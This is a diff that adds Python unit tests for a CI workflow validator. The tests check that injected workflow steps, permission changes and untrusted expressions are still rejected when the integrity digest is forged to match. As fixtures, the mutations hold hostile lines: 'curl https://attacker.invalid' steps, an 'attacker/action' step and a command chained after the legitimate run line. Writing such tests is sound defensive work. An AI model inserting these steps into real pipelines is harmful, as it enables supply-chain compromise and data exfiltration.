@@ -5,6 +5,7 @@ from __future__ import annotations
 
 import ast
 import copy
+import hashlib
 import importlib.util
 import json
 import os
@@ -1510,6 +1511,128 @@ class WorkflowSecurityTest(unittest.TestCase):
             with self.subTest(mutation=mutation[-80:]):
                 with self.assertRaises(live.LiveGateError):
                     live.validate_workflow_text(mutation)
+
+    def test_coordinated_digest_cannot_hide_structural_step_attacks(self) -> None:
+        checkout_line = (
+            "      - uses: attacker/action@"
+            "0123456789abcdef0123456789abcdef01234567"
+        )
+        mutations = [
+            self.text.replace(
+                "    steps:\n      - name:",
+                f"    steps:\n{checkout_line}\n      - name:",
+                1,
+            ),
+            self.text.replace(
+                "        run: python3 scripts/completion_claim_live.py process",
+                "        run: python3 scripts/completion_claim_live.py process"
+                "\n      - run: curl https://attacker.invalid",
+                1,
+            ),
+            self.text.replace(
+                "          fetch-depth: 1",
+                "          fetch-depth: 1"
+                "\n          - uses: attacker/action@"
+                "0123456789abcdef0123456789abcdef01234567",
+                1,
+            ),
+            self.text.replace(
+                "        id: select",
+                "        - run: curl https://attacker.invalid"
+                "\n        id: select",
+                1,
+            ),
+            self.text.replace(
+                "        run: python3 scripts/completion_claim_live.py process",
+                "        run: python3 scripts/completion_claim_live.py process"
+                "\n        shell: bash",
+                1,
+            ),
+            self.text.replace(
+                "        run: python3 scripts/completion_claim_live.py process",
+                "        run: python3 scripts/completion_claim_live.py process"
+                "\n        working-directory: /tmp",
+                1,
+            ),
+            self.text.replace(
+                "        run: python3 scripts/completion_claim_live.py process",
+                "        run: python3 scripts/completion_claim_live.py process"
+                "\n        continue-on-error: true",
+                1,
+            ),
+            self.text.replace(
+                "run: python3 scripts/completion_claim_live.py process",
+                "run: python3 scripts/completion_claim_live.py process"
+                "; curl https://attacker.invalid",
+                1,
+            ),
+            self.text.replace(
+                "run: python3 scripts/completion_claim_live.py process",
+                "run: |\n          "
+                "python3 scripts/completion_claim_live.py process",
+                1,
+            ),
+            self.text
+            + "\n  attacker:\n"
+            + "    runs-on: ubuntu-latest\n"
+            + "    steps:\n"
+            + "      - uses: attacker/action@"
+            + "0123456789abcdef0123456789abcdef01234567\n",
+        ]
+        for mutation in mutations:
+            coordinated = hashlib.sha256(mutation.encode("utf-8")).hexdigest()
+            with (
+                self.subTest(mutation=mutation[-120:]),
+                mock.patch.object(live, "WORKFLOW_SHA256", coordinated),
+                self.assertRaisesRegex(
+                    live.LiveGateError,
+                    "WORKFLOW_STEP_STRUCTURE_MISMATCH",
+                ),
+            ):
+                live.validate_workflow_text(mutation)
+
+    def test_coordinated_permission_and_expression_mutants_keep_exact_codes(self) -> None:
+        permission_mutant = self.text.replace(
+            "      statuses: write",
+            "      actions: write",
+            1,
+        )
+        permission_digest = hashlib.sha256(
+            permission_mutant.encode("utf-8")
+        ).hexdigest()
+        with (
+            mock.patch.object(
+                live,
+                "WORKFLOW_SHA256",
+                permission_digest,
+            ),
+            self.assertRaisesRegex(
+                live.LiveGateError,
+                "WORKFLOW_PERMISSION_MISMATCH",
+            ),
+        ):
+            live.validate_workflow_text(permission_mutant)
+
+        expression_mutant = self.text.rsplit(
+            "${{ matrix.pr_number }}",
+            1,
+        )
+        expression_text = "${{ github.run_id }}".join(expression_mutant)
+        expression_digest = hashlib.sha256(
+            expression_text.encode("utf-8")
+        ).hexdigest()
+        with (
+            mock.patch.object(
+                live,
+                "WORKFLOW_SHA256",
+                expression_digest,
+            ),
+            self.assertRaisesRegex(
+                live.LiveGateError,
+                "UNTRUSTED_WORKFLOW_EXPRESSION",
+            ),
+        ):
+            live.validate_workflow_text(expression_text)
 
     def test_all_events_share_one_pr_matrix_concurrency_key(self) -> None:
         expected = (
